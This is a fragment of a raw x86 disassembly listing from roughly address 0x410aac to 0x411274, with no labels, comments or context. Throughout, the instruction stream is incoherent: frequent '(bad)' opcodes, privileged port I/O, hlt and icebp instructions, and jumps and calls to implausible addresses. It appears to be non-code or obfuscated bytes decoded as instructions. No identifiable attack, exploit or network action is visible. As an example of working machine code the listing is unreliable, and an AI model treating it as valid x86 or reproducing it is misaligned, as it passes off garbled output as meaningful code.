  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
